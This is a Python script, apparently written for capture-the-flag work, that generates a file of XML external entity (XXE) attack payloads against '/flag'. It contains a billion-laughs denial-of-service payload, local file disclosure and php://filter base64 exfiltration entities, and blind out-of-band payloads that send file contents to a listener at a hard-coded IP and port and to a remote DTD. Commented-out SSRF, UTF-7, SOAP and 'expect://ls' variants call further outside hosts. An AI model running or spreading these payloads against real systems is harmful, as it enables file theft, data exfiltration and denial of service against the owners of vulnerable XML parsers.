import base64

person = {'FilePath': 'file:///flag',#文件夹
          'encoding':'ISO-8859-1',#编码
          'ListenerPort':'114.115.216.228:9023',#监听端口
          'url-dtd':'xxx'#dtd文件


          }
#filepath可以跑字典
payload_path='D://jetbrain//project//auto-xxe-payload//payload.txt'
#固定项
# XXE: Denial-of-Service Example
FixedPayloadXXEDenialofServiceExample='<!--?xml version="1.0" ?-->'\
'<!DOCTYPE lolz [<!ENTITY lol "lol"><!ELEMENT lolz (#PCDATA)>'\
'  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;">'\
'  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">'\
'  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">'\
'  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">'\
'  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">'\
'  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">'\
'  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">'\
'  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">'\
'  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">'\
']><tag>&lol9;</tag>'
#固定
#  XXE: File Disclosure
FixedPayloadXxeBasicXmlExample1 ='<!--?xml version="1.0" ?-->'  \
'<userInfo> '  \
' <firstName>John</firstName> '  \
' <lastName>Doe</lastName> '  \
'</userInfo> '
FixedPayloadXxeBasicXmlExample2 ='<userInfo> '  \
' <firstName>John</firstName> '  \
' <lastName>Doe</lastName> '  \
'</userInfo> '
#固定
FixedPayloadXXEEntityExample ='<!--?xml version="1.0" ?-->'  \
'<!DOCTYPE replace [<!ENTITY example "Doe"> ]> '  \
' <userInfo> '  \
'  <firstName>John</firstName> '  \
'  <lastName>&example;</lastName> '  \
' </userInfo> '

#文件夹
PathScanningXxeClassicXxe1='<?xml version="1.0"?>' \
              '<!DOCTYPE data [' \
              '<!DOCTYPE data [' \
              f'<!ENTITY file SYSTEM "{person["FilePath"]}">' \
              ']>' \
              '<data>&file;</data>'
#文件夹
PathScanningXxeClassicXxe2= f'<?xml version="1.0" encoding="{person["encoding"]}"?> ' \
'   <!DOCTYPE foo [  ' \
'   <!ELEMENT foo ANY > ' \
f'   <!ENTITY xxe SYSTEM "{person["FilePath"]}" >]><foo>&xxe;</foo>'

#文件夹
PathScanningXXEFileDisclosure='<!--?xml version="1.0" ?-->'  \
f'<!DOCTYPE replace [<!ENTITY ent SYSTEM "{person["FilePath"]}"> ]> '  \
'<userInfo> '  \
' <firstName>John</firstName> '  \
' <lastName>&ent;</lastName> '  \
'</userInfo>'

#文件夹
# XXE: Local File Inclusion Example
PathScanningXXELocalFileInclusionExample='<?xml version="1.0"?>'\
'<!DOCTYPE foo [  '\
'<!ELEMENT foo (#ANY)>'\
f'<!ENTITY xxe SYSTEM "{person["FilePath"]}">]><foo>&xxe;</foo>'
#伪协议+文件夹
# XXE: Access Control Bypass (Loading Restricted Resources - PHP example)
filepath = person['FilePath']
encoded_filepath = base64.b64encode(filepath.encode()).decode()
PathScanningXXEAccessControlBypass='<?xml version="1.0"?>'\
'<!DOCTYPE foo ['\
f'''<!ENTITY ac SYSTEM "php://filter/read=convert.base64-encode/resource="{encoded_filepath}"">]>'''\
'<foo><result>&ac;</result></foo>'
#伪协议+加密
# XXE: Base64 Encoded
EncryptedPathScanningXXEBase64Encoded=f'''<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,{person['FilePath']}"> %init; ]><foo/>'''
#vps收
# XXE: Blind Local File Inclusion Example (When first case doesn't return anything.)
XXEListenerPortLocalFileInclusionExample1='<?xml version="1.0"?>'\
'<!DOCTYPE foo ['\
'<!ELEMENT foo (#ANY)>'\
f'<!ENTITY % xxe SYSTEM "{person["FilePath"]}">'\
f'<!ENTITY ListenerPort SYSTEM "{person["ListenerPort"]}">]><foo>&ListenerPort;</foo>'
XXEListenerPortLocalFileInclusionExample2='<?xml version="1.0" encoding="UTF-8"?>' \
                                          '<!DOCTYPE hacker[' \
                                          ' <!ENTITY  % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">' \
                                          '<!ENTITY  % myurl SYSTEM "http://vps-ip/test.dtd">' \
                                          '%myurl;' \
                                          ']> <root>1</root>'
#dtd
# <!ENTITY % dtd "<!ENTITY &#x25; vps SYSTEM 'http://vps-ip:port/%file;'> ">
# %dtd;
# %vps;



##外带
##XXE:SSRF ( Server Side Request Forgery ) Example
# SSRFExample='<?xml version="1.0"?>'\
# '<!DOCTYPE foo [  '\
# '<!ELEMENT foo (#ANY)>'\
# '<!ENTITY xxe SYSTEM "https://www.example.com/text.txt">]><foo>&xxe;</foo>'
##外带
##*  XXE: (Remote Attack - Through External Xml Inclusion) Exmaple
# XXEExmaple='<?xml version="1.0"?>'\
# ' <!DOCTYPE lolz ['\
# ' <!ENTITY test SYSTEM "https://example.com/entity1.xml">]>'\
# ' <lolz><lol>3..2..1...&test<lol></lolz>'
##外带
##XXE: UTF-7 Exmaple
# XXEUTF7Exmaple=' <?xml version="1.0" encoding="UTF-7"?>'\
# ' +ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4'\
# ' +ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+'\
# ' +ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4'
##外带dtd
# XXEXXEinsideSOAPExample='soap:Body'\
# '  <foo>'\
# '    <![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]>'\
# '  </foo>'\
# '</soap:Body>'
##外带xml
# XXEXXEinsideSV=f'''<svg xmlns="{person['FilePath']}" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">'''\
# '    <image xlink:href="expect://ls"></image>'\
# '</svg>'

test={
      'XxeBasicXmlExample1':FixedPayloadXxeBasicXmlExample1,
      'XxeBasicXmlExample2':FixedPayloadXxeBasicXmlExample2,#无xml声明
      'XXEEntityExample':FixedPayloadXXEEntityExample,
      'XXEDenialofServiceExample':FixedPayloadXXEDenialofServiceExample,

      'XxeClassicXxe1':PathScanningXxeClassicXxe1,
      'XxeClassicXxe2':PathScanningXxeClassicXxe2,
      'XXEFileDisclosure':PathScanningXXEFileDisclosure,
      'XXELocalFileInclusionExample':PathScanningXXELocalFileInclusionExample,

      'EncryptedPathScanningXXEBase64Encoded':EncryptedPathScanningXXEBase64Encoded,
      'XXEListenerPortLocalFileInclusionExample1':XXEListenerPortLocalFileInclusionExample1,
      'XXEListenerPortLocalFileInclusionExample2':XXEListenerPortLocalFileInclusionExample2,

      # 'SSRFExample':SSRFExample,
      # 'XXEExmaple':XXEExmaple,
      # 'XXEUTF7Exmaple':XXEUTF7Exmaple,
      # 'XXEXXEinsideSOAPExample':XXEXXEinsideSOAPExample,
      # 'XXEXXEinsideSV':XXEXXEinsideSV
      }
with open(payload_path, "w") as f:
    for key, value in test.items():
        test[key] = value.replace('\n', ' ')
        f.write(str(test[key]) + "\n")
        print(test[key])



